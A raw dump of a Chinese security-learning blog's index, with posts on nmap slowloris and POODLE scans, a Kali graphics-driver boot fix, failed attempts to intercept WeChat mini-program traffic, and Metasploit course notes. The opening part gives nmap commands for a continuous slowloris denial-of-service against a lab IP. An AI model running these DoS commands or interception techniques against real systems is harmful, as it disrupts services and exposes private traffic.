    <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nmap -p <span class="number">80</span> --script http-slowloris --script-args http-slowloris.timelimit=<span class="number">15</span>m  <span class="number">192.168</span><span class="number">.30</span><span class="number">.39</span> </span><br></pre></td></tr></table></figure>
    **1.3http-slowloris.NSE脚本扩展http-slowloris.runforever参数**
        这个参数是对目标系统进行一直DoS攻击
        `--script-args `是用来指定参数的

    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap -p 80 --script http-slowloris --script-args http-slowloris.runforever 192.168.30.39 </span><br></pre></td></tr></table></figure>
    还有一个名为http-slowloris-check.NSE的脚本也是用来发送slowloris的，都是他只会发送2个请求
    例如
    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 80 --script http-slowloris-check 192.168.30.39 </span><br></pre></td></tr></table></figure>
2. POODLE漏洞扫描ssl-poodle脚本
    POODLE漏洞（亦即CVE-2014-3566）最早是由谷歌团队发现的，可以攻击者可以盗取，已经使用了的SSL3.0数据进行解密
    需要攻击者完全控制网络的流量，比如ARP欺骗，钓鱼wifi等等
    名为ssl-poodle的脚本来检查POODLE漏洞
    `--version-all`相当于`--version-intensity  9`  扫描强度


    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sV --version-all --script ssl-poodle -p 443 192.168.30.39 </span><br></pre></td></tr></table></figure></code></pre>
<h2 id="QQ2737977997"><a href="#QQ2737977997" class="headerlink" title="QQ2737977997"></a>QQ2737977997</h2>]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>union联合查询注入</tag>
      </tags>
  </entry>
  <entry>
    <title>解决显卡问题，kali启动死循环&quot; 5.921.261] nouveau 0000:01:00.0:&quot;</title>
    <url>/2020/08/27/%E8%A7%A3%E5%86%B3%E6%98%BE%E5%8D%A1%E9%97%AE%E9%A2%98%EF%BC%8Ckali%E5%90%AF%E5%8A%A8%E6%AD%BB%E5%BE%AA%E7%8E%AF%205.921.261%5D%20nouveau%200000:01:00.0:/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>我的笔记本是winodws10和kali双系统<br>启动kali出现死循环5.921.261] nouveau 0000:01:00.0: fifo: SCHED_ERROR 06 ，就算重新装kali也是这个问题 ，根本就进不去系统,研究了多个深夜，<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200511105630754.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70"></p>
<p>我花了很长时间琢磨摸索研究是什么问题，终于叫这个问题给解决了</p>
<h2 id="摸索过程"><a href="#摸索过程" class="headerlink" title="摸索过程"></a>摸索过程</h2><p>，win10独立显卡驱动安装不上就算是安装上了，也不能用，报43错误，官方最新驱动以前的老驱动，重做系统，win10还是这样，我估计是独立显卡坏了，</p>
<p>，启动kali无线<strong>5.921.261] nouveau 0000:01:00.0: fifo: SCHED_ERROR 06</strong> ，是显卡驱动nouveau  ，<br>然后我在百度上找了很多资料，<br>刚开始kali是好的，然后突然就出现了这个问题，有大神说可能所引导没有安装好，从新安装kali，也是没有解决这个问题，我想可能是我的镜像有问题，我计算了他的值和官方的值一样，说明镜像是没有问题的，找了很多方法，还是没有解决，已经到了深夜了，我最后看了一篇文字，<a href="https://blog.csdn.net/yaorengjin0808/article/details/81613331">https://blog.csdn.net/yaorengjin0808/article/details/81613331</a> 用了这个方法发现可以进入系统了，应为kali2020系统GRUB内核参数有变动，下面是我研究了好长时间，</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><ol>
<li><p>进入系统，叫你选系统的时候按e键，进入编辑模式，</p>
</li>
<li><p>在这里添加这串字符<code>nouveau.modeset=0;</code>，splash在前面也可以<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200511105947952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   俺F10值启动发现就可以进入系统了<br>   <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200511110429756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>添加GRUB添加内核参数<br>进入<code>sudo vim /etc/default/grub</code><br>添加这个<code>splash nouveau.modeset=0</code></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200511110632400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70"></p>
<p>命令<code>update-grub</code></p>
<h2 id="解决这个问题参考了很多网上的资料，"><a href="#解决这个问题参考了很多网上的资料，" class="headerlink" title="解决这个问题参考了很多网上的资料，"></a>解决这个问题参考了很多网上的资料，</h2><h2 id="QQ2737977997"><a href="#QQ2737977997" class="headerlink" title="QQ2737977997"></a>QQ2737977997</h2></li>
</ol>
]]></content>
      <categories>
        <category>解决显卡问题</category>
      </categories>
      <tags>
        <tag>解决显卡问题</tag>
      </tags>
  </entry>
  <entry>
    <title>抓微信小程序数据</title>
    <url>/2020/08/29/%E6%8A%93%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="我用了很多方法进行抓取微信小程序里面的数据"><a href="#我用了很多方法进行抓取微信小程序里面的数据" class="headerlink" title="我用了很多方法进行抓取微信小程序里面的数据"></a>我用了很多方法进行抓取微信小程序里面的数据</h2><h2 id="网上也有很多文章抓取小程序，都是都不靠谱，可能是我操作有问题吧还是那是小程序安全？，我就不研究了"><a href="#网上也有很多文章抓取小程序，都是都不靠谱，可能是我操作有问题吧还是那是小程序安全？，我就不研究了" class="headerlink" title="网上也有很多文章抓取小程序，都是都不靠谱，可能是我操作有问题吧还是那是小程序安全？，我就不研究了"></a>网上也有很多文章抓取小程序，都是都不靠谱，可能是我操作有问题吧还是那是小程序安全？，我就不研究了</h2><h2 id="通过抓包还是能抓取到内容的url都是可以获取到的，叫内容直接下载到本地"><a href="#通过抓包还是能抓取到内容的url都是可以获取到的，叫内容直接下载到本地" class="headerlink" title="通过抓包还是能抓取到内容的url都是可以获取到的，叫内容直接下载到本地"></a>通过抓包还是能抓取到内容的url都是可以获取到的，叫内容直接下载到本地</h2><ol>
<li>我用burp进行抓包<br> 官方下载地址<a href="https://portswigger.net/burp">https://portswigger.net/burp</a><br> burp这个工具我之前学习过将近2个月差不多，学习还算容易写笔记难<br> 安装ca证书<br> 可是他进去小程序显示网络不能用，这样不知道是什么原因，可能是有什么安全机制吗<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200417152342833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ol>
<p><strong>访问https正常</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200417152642285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200417152631861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ol start="3">
<li><p>charles<br> 官方下载地址<a href="https://www.charlesproxy.com/latest-release/download.do">https://www.charlesproxy.com/latest-release/download.do</a></p>
<h2 id="结果还是一样"><a href="#结果还是一样" class="headerlink" title="结果还是一样"></a>结果还是一样</h2></li>
<li><p><strong>手机版的抓包软件AndroidHttpCapture</strong></p>
<h2 id="进行抓包效果"><a href="#进行抓包效果" class="headerlink" title="进行抓包效果"></a>进行抓包效果</h2><p> 还是一样<br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200417152631861.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ol>
<h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><h2 id="1-还用了叫https请求强制成http请求-这个方法还是不行"><a href="#1-还用了叫https请求强制成http请求-这个方法还是不行" class="headerlink" title="1.还用了叫https请求强制成http请求 这个方法还是不行"></a>1.还用了叫https请求强制成http请求 这个方法还是不行</h2><h2 id="2-抓包分析"><a href="#2-抓包分析" class="headerlink" title="2.抓包分析"></a>2.抓包分析</h2><p>这个有个缺点就是都是加密的，但是有的是不加密的</p>
<p>我就是难受理论应该我可以行得通的都是实现是很难吗<br>我又用了很多方法，比如叫用Wireshark进行抓包是可以抓的到的分析了很长时间，<br>在电脑上打开小程序<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418114830123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以分析出来，但是有的还是本加密了</p>
<h2 id="3-还有那个电脑版的微信用代理在代理到截断工具上这个也是。。。。。。。。。。"><a href="#3-还有那个电脑版的微信用代理在代理到截断工具上这个也是。。。。。。。。。。" class="headerlink" title="3. 还有那个电脑版的微信用代理在代理到截断工具上这个也是。。。。。。。。。。"></a>3. 还有那个电脑版的微信用代理在代理到截断工具上这个也是。。。。。。。。。。</h2><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200418122453457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="4，中间人伪造证书这个，对称加密，叫加密的数据解开-这个方法还是没有什么作用"><a href="#4，中间人伪造证书这个，对称加密，叫加密的数据解开-这个方法还是没有什么作用" class="headerlink" title="4，中间人伪造证书这个，对称加密，叫加密的数据解开 这个方法还是没有什么作用"></a>4，中间人伪造证书这个，对称加密，叫加密的数据解开 这个方法还是没有什么作用</h2><h2 id="5-还有用了很多方法进行获取小程序数据就不多说了"><a href="#5-还有用了很多方法进行获取小程序数据就不多说了" class="headerlink" title="5. 还有用了很多方法进行获取小程序数据就不多说了"></a>5. 还有用了很多方法进行获取小程序数据就不多说了</h2><h2 id="QQ2737977997"><a href="#QQ2737977997" class="headerlink" title="QQ2737977997"></a>QQ2737977997</h2>]]></content>
      <categories>
        <category>抓微信小程序数据</category>
      </categories>
      <tags>
        <tag>抓微信小程序数据</tag>
      </tags>
  </entry>
  <entry>
    <title>1.Metasploit介绍和模块</title>
    <url>/2020/08/29/1.Metasploit%E4%BB%8B%E7%BB%8D%E5%92%8C%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="苑房弘课程"><a href="#苑房弘课程" class="headerlink" title="苑房弘课程"></a>苑房弘课程</h2><p><strong>学习msf的笔记</strong></p>
<p>Metasploit是一个非常强大的渗透测试框架</p>
<ul>
<li>2003年有HD Moore编写的，2007 年用 ruby 语言编写<ul>
<li>框架继承了渗透测试标准（PETS）标准</li>
<li>一定程度上统一了渗透测试研究的工作环境</li>
<li>新的攻击代码可以比较容易的加入框架</li>
</ul>
</li>
<li>开发活跃版本更新频繁<ul>
<li>早期版本基于社区力量维护，被 Rapid 7 收购后大枣出其商业版本产品</li>
<li>目前分化为四个版本，社区版依然十分活跃</li>
<li>HD More说：为 Metasploit 写书是种自虐</li>
</ul>
</li>
</ul>
<p>2009年10月21号，漏洞管理解决公司Rapid7收购Metasploit项目</p>
<p><strong>Metasploit 有四个版本，默认kali linux 集成的是Metasploit  Framework版本</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200408125335180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>Metasploit  Framework简称msf<br>下面我们就说Metasploit  Framework这个来介绍</p>
<ul>
<li>msf他使用的是 <strong>postgresql</strong> 数据库<ul>
<li>扫描下来得到的信息都保存到postgresql数据库数据库里</li>
</ul>
</li>
</ul>
<h2 id="MSF架构"><a href="#MSF架构" class="headerlink" title="MSF架构"></a>MSF架构</h2><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200408131408719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="1-Rex"><a href="#1-Rex" class="headerlink" title="1. Rex"></a>1. Rex</h2><ul>
<li>Rex是msf最基本依赖的库，<ul>
<li>基本功能库，用于完成日常基本任务，无需人工手动编码实现</li>
<li>处理 socket 连接诶访问、协议应答（http/SSL/SMB 等）</li>
<li>编码转换（XOR、Base64、Unicode）<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200408134155318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
</li>
</ul>
<h2 id="2-Msf-Core"><a href="#2-Msf-Core" class="headerlink" title="2.Msf::Core"></a>2.Msf::Core</h2><ul>
<li>他是提供 Metasploit的核心最底层的基本 API，是框架的核心能力实现库<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200408133048148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
<h2 id="3-Msf-Base"><a href="#3-Msf-Base" class="headerlink" title="3. Msf::Base"></a>3. Msf::Base</h2><ul>
<li>提供友好的的 API 接口，便于模块调用的库<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020040813322836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
<h2 id="4-他的使用方法"><a href="#4-他的使用方法" class="headerlink" title="4. 他的使用方法"></a>4. 他的使用方法</h2><ul>
<li>比如有web的使用，有命令行的使用<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200408133637519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
<h1 id="5-Plugin-插件-和目录结构"><a href="#5-Plugin-插件-和目录结构" class="headerlink" title="5. Plugin 插件 和目录结构"></a>5. Plugin 插件 和目录结构</h1><ul>
<li>连接和调用外部扩展功能和系统</li>
<li>他直接就可以调用其他的工具</li>
</ul>
<p><strong>5.1介绍目录结构</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409120706840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>modules</strong>：目录里面存放模块的<br><strong>plugins</strong>：目录里面存放插件的<br><strong>tools</strong>：目录里面存放其他的工具的<br><strong>scripts</strong>：目录里面存放辅助的脚本的<br><strong>db</strong>：数据库的放在这个目录里<br><strong>data</strong>：使用到的文件，比如密码字典<br><strong>lib</strong>：库文件都保持在这个目录里<br><strong>config</strong>：存放这配置文件在这个目录里<br>还有其他的文件都是执行的比如<strong>msfconsole</strong>就是生成木马的程序</p>
<p><strong>细说modules模块文件</strong></p>
<p>他的模块都放在<code>/usr/share/metasploit-framework/modules/</code>这个目录下<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409115811744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看一下目录，应为msf更新的比较快，我看的教程里面没有现在这个<strong>evasion</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409122015974.png" alt="在这里插入图片描述"></p>
<ol>
<li>auxiliary （辅助模块）<br>执行信息收集、枚举、指纹探测、扫描等功能的辅助模块（没有 payload 的 exploit 模块）</li>
<li>encoders （编码模块）<br>对病毒进行加密，躲避杀毒软件的查杀</li>
<li>exploits（漏洞利用模块）<br>利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</li>
<li>nops（空指令模块）<br>空指令就是空操作，提高 paylaod 稳定性及维持大小</li>
<li>payloads（攻击载荷模块）<br>就是我们成功真正在目标系统进行执行的代码，比如bind shell和反弹shell等<br>里面还有三个目录<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409141541237.png" alt="在这里插入图片描述"><br>Stager：目标计算机内存有限时，先传输一个较小的 病毒用于建立连接<br>stages：利用 stager 建立的连接下载的后续病毒<br>stager、stages 都有多种类型，适用于不同场景</li>
</ol>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>2. Mestasploit 基本使用</title>
    <url>/2020/08/29/2.%20%E5%86%8D%E5%AD%A6Mestasploit%20%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="苑房弘课程"><a href="#苑房弘课程" class="headerlink" title="苑房弘课程"></a>苑房弘课程</h2><p><strong>我的学习笔记</strong><br>进行更新Mestasploit命令：<code>apt update; apt install metasploit-framework</code></p>
<ol>
<li>Mestasploit启动<br> 安静的启动-q<br> 指定文件启动-r<br> 查看版本信息-v</li>
</ol>
<h2 id="常用的参数"><a href="#常用的参数" class="headerlink" title="常用的参数"></a>常用的参数</h2><ol>
<li>查看参数<br><code>help</code>查看参数<br>或者输入<code>？</code>也可以但是？不能Tab补齐了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409181233509.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>-h</code>查看参数的使用<br>如果你那个参数忘了怎么使用的了可以用 <code>参数名 -h</code><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409181610928.png" alt="在这里插入图片描述"></li>
<li><code>banner</code>(小贴士)命令<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409183107917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>color(颜色修改)</li>
<li>connect(和nc一样)</li>
<li>show命令<br> 请一定认真看。如果单纯的输入show，那么就会显示出所有的payload，利用模块，post模块，插件等等。但是一般我们都不这么使用<br> 下面的模块在这个有介绍<a href="https://blog.csdn.net/qq_41860876/article/details/105383802">https://blog.csdn.net/qq_41860876/article/details/105383802</a><br> <strong>rank：表示好用级别：normal（正常），excellent（优秀），good（良好），average（平均）</strong></li>
</ol>
<p><strong>5.1  payloads（攻击载荷模块）</strong><br> payloads 模块:命名规则: <strong><em>操作系统/类型/名称</em></strong><br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410123805728.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> <strong>5.2 auxiliary （辅助模块）</strong><br> auxiliary 模块: 命名规则:<strong><em>功能/服务/名称</em></strong>  <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020041012390551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> <strong>5.3exploits （漏洞利用模块）</strong><br> 命名规则:<strong><em>操作系统/服务/名称</em></strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410124315305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>5.4encoders模块</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410124651791.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>还有3个就不在查看了</strong><br>6. search (搜索命令)</p>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search 要搜索的名字 </span><br></pre></td></tr></table></figure></code></pre>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410125220189.png" alt="在这里插入图片描述"><br>    <strong>命名过滤</strong></p>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search name:要搜索的命名</span><br></pre></td></tr></table></figure></code></pre>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410125740958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>搜索时间的</strong></p>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search cve:要搜索的时间</span><br></pre></td></tr></table></figure></code></pre>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410130101555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 具体使用可以-h查看<br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020041013040126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>7. use进入模块<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410144936105.png" alt="在这里插入图片描述"></p>
<h2 id="只有在进入模块里面才能使用的命令"><a href="#只有在进入模块里面才能使用的命令" class="headerlink" title="只有在进入模块里面才能使用的命令"></a>只有在进入模块里面才能使用的命令</h2><ol start="8">
<li><p>info显示使用信息和介绍<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410151249260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>继续show命令</p>
<p> 查看配置选择</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410151719792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>  在这个模块下用show payloads<br>  他只会显示在这个模块里面能用的payloads<br>  <strong>查看高级参数</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410152410588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>  <strong>查看必须设置的参数还没有设置</strong></p>
</li>
</ol>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show missing </span><br></pre></td></tr></table></figure></code></pre>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410152618371.png" alt="在这里插入图片描述"><br>10. set（修改配置）<br>    这个我就不多说了都知道什么意思<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410153551879.png" alt="在这里插入图片描述"></p>
<ol start="11">
<li>check（是否存在漏洞）<br>有的模块不支持check这个命令的，有的支持<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410153645847.png" alt="在这里插入图片描述"></li>
</ol>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>3.Metasploit使用</title>
    <url>/2020/08/29/3.Metasploit%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="去年学的都忘了掉了没有写笔记"><a href="#去年学的都忘了掉了没有写笔记" class="headerlink" title="去年学的都忘了掉了没有写笔记"></a>去年学的都忘了掉了没有写笔记</h2><h2 id="再学Metasploit学习笔记，"><a href="#再学Metasploit学习笔记，" class="headerlink" title="再学Metasploit学习笔记，"></a>再学Metasploit学习笔记，</h2><p><strong>我启动msf后出现的问题</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;20-04-09 16:35&#125;kali:~ kali% sudo msfconsole</span><br><span class="line">[sudo] kali 的密码：</span><br><span class="line">[-] ***rting the Metasploit Framework console...|</span><br><span class="line">[-] * WARNING: No database support: No database YAML file</span><br><span class="line">[-] ***</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409163737511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看数据库没有连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 &gt; db_status </span><br><span class="line">[*] postgresql selected, no connection  </span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409163429205.png" alt="在这里插入图片描述"><br><strong>解决这个问题初始化一下数据库就可以了</strong><br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfdb init</span><br></pre></td></tr></table></figure>
